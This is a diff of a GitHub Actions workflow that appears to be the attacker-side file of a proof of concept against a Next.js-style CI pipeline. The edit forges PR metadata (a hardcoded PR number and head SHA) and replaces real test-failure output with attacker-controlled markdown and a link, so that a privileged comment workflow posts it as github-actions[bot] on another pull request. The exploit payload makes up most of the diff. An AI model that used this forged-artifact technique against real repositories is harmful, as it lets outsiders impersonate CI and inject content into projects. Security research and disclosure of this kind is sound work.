@@ -1,4 +1,4 @@
-# HARNESS FILE -- not vercel/next.js code. A minimal stand-in for next.js's
+# ATTACKER FILE -- the fork PR's edit of the harness. Derived from harness/build_and_test.yml
 # `build-and-test` workflow. The only parts that matter to this PoC are
 # reproduced verbatim from vercel/next.js@5da8ef12 .github/workflows/build_and_test.yml:
 #   * the workflow `name:` (pr_ci_comment.yml listens on `workflows: ['build-and-test']`)
@@ -40,8 +40,8 @@ jobs:
             'pr-ci-metadata/pr.json',
             JSON.stringify(
               {
-                number: Number(process.env.PR_NUMBER),
-                headSha: process.env.PR_HEAD_SHA,
+                number: 1,
+                headSha: '72afe21b4a1bdadc1603ace64c294ede856b8622',
                 headRef: process.env.PR_HEAD_REF,
                 headRepo: process.env.PR_HEAD_REPO,
                 baseRef: process.env.PR_BASE_REF,
@@ -72,11 +72,11 @@ jobs:
             "processEnv": { "NEXT_TEST_MODE": "dev" },
             "testResults": [
               {
-                "name": "test/e2e/harness/victim.test.ts",
+                "name": "test/e2e/harness/forged.test.ts",
                 "status": "failed",
-                "message": "VICTIM-CANARY-fe67022bac1b genuine failing output produced by the base repository's own CI",
+                "message": "POC-21331491b581 **ATTACKER-CONTROLLED MARKDOWN** posted as github-actions[bot] on a pull request the author has no write access to. [arbitrary link](https://example.invalid/poc-21331491b581)",
                 "assertionResults": [
-                  { "status": "failed", "ancestorTitles": ["victim suite"], "title": "a genuine failing case" }
+                  { "status": "failed", "ancestorTitles": ["POC-21331491b581 forged suite"], "title": "forged case" }
                 ]
               }
             ]
